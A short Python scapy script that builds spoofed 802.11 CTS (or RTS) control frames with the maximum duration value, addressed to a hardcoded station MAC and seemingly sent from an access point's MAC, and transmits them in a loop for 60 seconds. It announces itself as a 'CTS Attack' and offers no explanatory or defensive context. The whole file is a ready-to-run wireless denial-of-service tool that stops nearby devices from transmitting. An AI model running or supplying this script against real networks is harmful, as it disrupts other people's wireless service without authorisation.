import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11

intfmon = 'wlan0'
ap = 'F8:63:94:9A:03:13'
sta = 'C0:EE:FB:47:E8:06'
duration = 60  # seconds to keep Deauthing
subtype = 12  # Frame subtype can be 11:RTS and 12:CTS
verbose = 1  # debug level (0-1)

# Start main loop
timestamp = time.time()
print(f'Starting CTS Attack using ({intfmon}) to Station:{sta} from AP:{ap}')
pkt = RadioTap() / Dot11(type=1, subtype=subtype, addr1=sta,
                         addr2=ap, addr3=ap, ID=32767)
if verbose:
    pkt.show()
    ls(pkt)
    input("Press any key to continue...")

while time.time() < (timestamp + duration):
    sendp(pkt, count=2, iface=intfmon, verbose=verbose, inter=0.1)